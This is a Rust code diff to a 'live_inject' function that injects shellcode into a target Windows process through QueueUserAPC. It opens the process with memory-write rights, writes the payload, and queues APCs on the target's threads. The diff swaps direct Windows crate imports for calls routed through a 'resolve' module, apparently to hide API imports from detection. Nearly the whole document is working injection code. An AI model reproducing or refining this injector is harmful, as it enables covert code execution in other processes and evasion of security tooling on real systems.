@@ -9,14 +9,25 @@ pub fn live_inject(
 ) -> Result<InjectionResult, String> {
     use super::common::{free_remote, write_remote_payload};
     use super::wrappers::wrap_for_apc;
-    use windows::Win32::Foundation::{CloseHandle, FALSE};
-    use windows::Win32::System::Diagnostics::ToolHelp::{
-        CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
-    };
-    use windows::Win32::System::Threading::{
-        OpenProcess, OpenThread, QueueUserAPC, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-        PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
-    };
+    use crate::resolve;
+
+    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+    const PROCESS_VM_OPERATION: u32 = 0x0008;
+    const PROCESS_VM_READ: u32 = 0x0010;
+    const PROCESS_VM_WRITE: u32 = 0x0020;
+    const THREAD_SET_CONTEXT: u32 = 0x0010;
+    const TH32CS_SNAPTHREAD: u32 = 0x00000004;
+
+    #[repr(C)]
+    struct THREADENTRY32 {
+        dw_size: u32,
+        cnt_usage: u32,
+        th32_thread_id: u32,
+        th32_owner_process_id: u32,
+        tp_base_pri: i32,
+        tp_delta_pri: i32,
+        dw_flags: u32,
+    }
 
     log.step(format!(
         "[1/5] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
@@ -24,9 +35,10 @@ pub fn live_inject(
     ));
     let process_access =
         PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
-    let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
-        format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
-    })?;
+    let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
+    if process.is_null() {
+        return Err("OpenProcess failed (check privileges — try from an elevated shell)".to_string());
+    }
 
     let wrapped = wrap_for_apc(shellcode);
     let size = wrapped.len();
@@ -34,52 +46,46 @@ pub fn live_inject(
 
     log.step("[5/5] QueueUserAPC — enumerating threads and queuing APCs");
 
-    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }.map_err(|e| {
+    let snapshot = unsafe { resolve::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
+    let invalid_handle = -1isize as *mut std::ffi::c_void;
+    if snapshot.is_null() || snapshot == invalid_handle {
         free_remote(process, base, log);
-        format!("CreateToolhelp32Snapshot failed: {e}")
-    })?;
+        return Err("CreateToolhelp32Snapshot failed".to_string());
+    }
 
-    let mut entry = THREADENTRY32 {
-        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
-        ..Default::default()
-    };
+    let mut entry: THREADENTRY32 = unsafe { std::mem::zeroed() };
+    entry.dw_size = std::mem::size_of::<THREADENTRY32>() as u32;
 
     let mut queued: u32 = 0;
     let mut total: u32 = 0;
 
-    if unsafe { Thread32First(snapshot, &mut entry) }.is_ok() {
+    if unsafe { resolve::Thread32First(snapshot, &mut entry as *mut _ as *mut std::ffi::c_void) } != 0 {
         loop {
-            if entry.th32OwnerProcessID == pid {
+            if entry.th32_owner_process_id == pid {
                 total += 1;
-                if let Ok(thread) =
-                    unsafe { OpenThread(THREAD_SET_CONTEXT, FALSE, entry.th32ThreadID) }
-                {
-                    let apc_func = Some(unsafe {
-                        core::mem::transmute::<
-                            *mut core::ffi::c_void,
-                            unsafe extern "system" fn(usize),
-                        >(base)
-                    });
-                    if unsafe { QueueUserAPC(apc_func, thread, 0) } != 0 {
+                let thread = unsafe { resolve::OpenThread(THREAD_SET_CONTEXT, 0, entry.th32_thread_id) };
+                if !thread.is_null() {
+                    let apc_func = base as *const std::ffi::c_void;
+                    if unsafe { resolve::QueueUserAPC(apc_func, thread, 0) } != 0 {
                         queued += 1;
                         log.info(format!(
                             "      queued APC to thread TID {}",
-                            entry.th32ThreadID
+                            entry.th32_thread_id
                         ));
                     }
-                    let _ = unsafe { CloseHandle(thread) };
+                    unsafe { resolve::CloseHandle(thread) };
                 }
             }
-            if unsafe { Thread32Next(snapshot, &mut entry) }.is_err() {
+            if unsafe { resolve::Thread32Next(snapshot, &mut entry as *mut _ as *mut std::ffi::c_void) } == 0 {
                 break;
             }
         }
     }
-    let _ = unsafe { CloseHandle(snapshot) };
+    unsafe { resolve::CloseHandle(snapshot) };
 
     if queued == 0 {
         free_remote(process, base, log);
-        let _ = unsafe { CloseHandle(process) };
+        unsafe { resolve::CloseHandle(process) };
         if total == 0 {
             return Err(format!("no threads found for PID {}", pid));
         }
@@ -89,7 +95,7 @@ pub fn live_inject(
         ));
     }
 
-    let _ = unsafe { CloseHandle(process) };
+    unsafe { resolve::CloseHandle(process) };
 
     log.info(format!(
         "      APCs queued to {}/{} threads",
